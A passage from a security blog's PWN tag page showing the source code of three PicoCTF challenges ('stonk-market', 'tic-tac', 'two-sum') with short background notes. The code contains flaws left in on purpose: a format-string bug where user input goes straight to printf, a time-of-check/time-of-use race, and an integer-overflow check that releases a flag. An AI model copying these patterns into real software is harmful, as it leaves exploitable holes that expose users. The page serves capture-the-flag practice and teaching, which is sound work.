+
+typedef struct Stonks {
+	int shares;
+	char symbol[MAX_SYM_LEN + 1];
+	struct Stonks *next;
+} Stonk;
+
+typedef struct Portfolios {
+	int money;
+	Stonk *head;
+} Portfolio;
+
+int view_portfolio(Portfolio *p) {
+	if (!p) {
+		return 1;
+	}
+	printf(&#34;\nPortfolio as of &#34;);
+	fflush(stdout);
+	system(&#34;date&#34;); // TODO: implement this in C
+	fflush(stdout);
+
+	printf(&#34;\n\n&#34;);
+	Stonk *head = p-&gt;head;
+	if (!head) {
+		printf(&#34;You don&#39;t own any stonks!\n&#34;);
+	}
+	while (head) {
+		printf(&#34;%d shares of %s\n&#34;, head-&gt;shares, head-&gt;symbol);
+		head = head-&gt;next;
+	}
+	return 0;
+}
+
+Stonk *pick_symbol_with_AI(int shares) {
+	if (shares &lt; 1) {
+		return NULL;
+	}
+	Stonk *stonk = malloc(sizeof(Stonk));
+	stonk-&gt;shares = shares;
+
+	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
+	for (int i = 0; i &lt;= MAX_SYM_LEN; i++) {
+		if (i &lt; AI_symbol_len) {
+			stonk-&gt;symbol[i] = &#39;A&#39; + (rand() % 26);
+		} else {
+			stonk-&gt;symbol[i] = &#39;\0&#39;;
+		}
+	}
+
+	stonk-&gt;next = NULL;
+
+	return stonk;
+}
+
+int buy_stonks(Portfolio *p) {
+	if (!p) {
+		return 1;
+	}
+	/*
+	char api_buf[FLAG_BUFFER];
+	FILE *f = fopen(&#34;api&#34;,&#34;r&#34;);
+	if (!f) {
+		printf(&#34;Flag file not found\n&#34;);
+		exit(1);
+	}
+	fgets(api_buf, FLAG_BUFFER, f);
+	*/
+	int money = p-&gt;money;
+	int shares = 0;
+	Stonk *temp = NULL;
+	printf(&#34;Using patented AI algorithms to buy stonks\n&#34;);
+	while (money &gt; 0) {
+		shares = (rand() % money) + 1;
+		temp = pick_symbol_with_AI(shares);
+		temp-&gt;next = p-&gt;head;
+		p-&gt;head = temp;
+		money -= shares;
+	}
+	printf(&#34;Stonks chosen\n&#34;);
+
+	char *user_buf = malloc(300 + 1);
+	printf(&#34;What is your API token?\n&#34;);
+	scanf(&#34;%300s&#34;, user_buf);
+	printf(&#34;Buying stonks with token:\n&#34;);
+	printf(user_buf);
+
+	// TODO: Actually use key to interact with API
+
+	view_portfolio(p);
+
+	return 0;
+}
+
+Portfolio *initialize_portfolio() {
+	Portfolio *p = malloc(sizeof(Portfolio));
+	p-&gt;money = (rand() % 2018) + 1;
+	p-&gt;head = NULL;
+	return p;
+}
+
+void free_portfolio(Portfolio *p) {
+	Stonk *current = p-&gt;head;
+	Stonk *next = NULL;
+	while (current) {
+		next = current-&gt;next;
+		free(current);
+		current = next;
+	}
+	free(p);
+}
+
+int main(int argc, char *argv[])
+{
+	setbuf(stdout, NULL);
+	srand(time(NULL));
+	Portfolio *p = initialize_portfolio();
+	if (!p) {
+		printf(&#34;Memory failure\n&#34;);
+		exit(1);
+	}
+
+	int resp = 0;
+
+	printf(&#34;Welcome back to the trading app!\n\n&#34;);
+	printf(&#34;What would you like to do?\n&#34;);
+	printf(&#34;1) Buy some stonks!\n&#34;);
+	printf(&#34;2) View my portfolio\n&#34;);
+	scanf(&#34;%d&#34;, &amp;resp);
+
+	if (resp == 1) {
+		buy_stonks(p);
+	} else if (resp == 2) {
+		view_portfolio(p);
+	}
+
+	free_portfolio(p);
+	printf(&#34;Goodbye!\n&#34;);
+
+	exit(0);
+}
+</code></pre><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---stonk-market/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---tic-tac/>PicoCTF - tic-tac</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---tic-tac>PicoCTF - tic-tac
+<a class=anchor href=#picoctf---tic-tac>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p><a href=https://myapollo.com.tw/blog/interview-question-race-condition/>後端工程師面試考什麼 - Race Condition 篇</a>
+<a href=https://ithelp.ithome.com.tw/articles/10208763>[Day24]攻擊篇</a></p><blockquote><p>TOCTTOU</p><p>Time of check to time of use
+在檢查和使用之間影響資源狀態的攻擊</p><p>這種攻擊可能發生在共享資源中。
+可能導致程式在資源處於意外狀態時執行無效操作。</p></blockquote><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;iostream&gt;
+#include &lt;fstream&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+
+int main(int argc, char *argv[]) {
+  if (argc != 2) {
+    std::cerr &lt;&lt; &#34;Usage: &#34; &lt;&lt; argv[0] &lt;&lt; &#34; &lt;filename&gt;&#34; &lt;&lt; std::endl;
+    return 1;
+  }
+
+  std::string filename = argv[1];
+  std::ifstream file(filename);
+  struct stat statbuf;
+
+  // Check the file&#39;s status information.
+  if (stat(filename.c_str(), &amp;statbuf) == -1) {
+    std::cerr &lt;&lt; &#34;Error: Could not retrieve file information&#34; &lt;&lt; std::endl;
+    return 1;
+  }
+
+  // Check the file&#39;s owner.
+  if (statbuf.st_uid != getuid()) {
+    std::cerr &lt;&lt; &#34;Error: you don&#39;t own this file&#34; &lt;&lt; std::endl;
+    return 1;
+  }
+
+  // Read the contents of the file.
+  if (file.is_open()) {
+    std::string line;
+    while (getline(file, line)) {
+      std::cout &lt;&lt; line &lt;&lt; std::endl;
+    }
+  } else {
+    std::cerr &lt;&lt; &#34;Error: Could not open file&#34; &lt;&lt; std::endl;
+    return 1;
+  }
+
+  return 0;
+}
+</code></pre><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---tic-tac/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---two-sum/>PicoCTF - two-sum</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---two-sum>PicoCTF - two-sum
+<a class=anchor href=#picoctf---two-sum>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>BoF</p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static int addIntOvf(int result, int a, int b) {
+    result = a + b;
+    if(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; result &lt; 0)
+        return -1;
+    if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result &gt; 0)
+        return -1;
+    return 0;
+}
+
+int main() {
+    int num1, num2, sum;
+    FILE *flag;
+    char c;
+
+    printf(&#34;n1 &gt; n1 + n2 OR n2 &gt; n1 + n2 \n&#34;);
+    fflush(stdout);
+    printf(&#34;What two positive numbers can make this possible: \n&#34;);
+    fflush(stdout);
+    
+    if (scanf(&#34;%d&#34;, &amp;num1) &amp;&amp; scanf(&#34;%d&#34;, &amp;num2)) {
+        printf(&#34;You entered %d and %d\n&#34;, num1, num2);
+        fflush(stdout);
+        sum = num1 + num2;
+        if (addIntOvf(sum, num1, num2) == 0) {
+            printf(&#34;No overflow\n&#34;);
+            fflush(stdout);
+            exit(0);
+        } else if (addIntOvf(sum, num1, num2) == -1) {
+            printf(&#34;You have an integer overflow\n&#34;);
+            fflush(stdout);
+        }
+
+        if (num1 &gt; 0 || num2 &gt; 0) {
+            flag = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
+            if(flag == NULL){
+                printf(&#34;flag not found: please run this on the server\n&#34;);
+                fflush(stdout);
+                exit(0);
+            }
+            char buf[60];
+            fgets(buf, 59, flag);
+            printf(&#34;YOUR FLAG IS: %s\n&#34;, buf);
+            fflush(stdout);
+            exit(0);
+        }
+    }
+    return 0;
+}
+</code></pre><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---two-sum/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/pwn/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/pwn/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/pwn/ aria-label="Page 1" class=page-link role=button>1</a></li><li class="page-item active"><a aria-current=page aria-label="Page 2" class=page-link role=button>2</a></li><li class=page-item><a href=/tags/pwn/page/3/ aria-label="Page 3" class=page-link role=button>3</a></li><li class=page-item><a href=/tags/pwn/page/4/ aria-label="Page 4" class=page-link role=button>4</a></li><li class=page-item><a href=/tags/pwn/page/5/ aria-label="Page 5" class=page-link role=button>5</a></li><li class=page-item><a href=/tags/pwn/page/3/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/pwn/page/6/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
+<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
+<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
+<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
+<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
+<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
+<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
+<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
+<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
+<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
+<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
+<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
+<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
+<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
+<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
+<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
+<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
+<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>
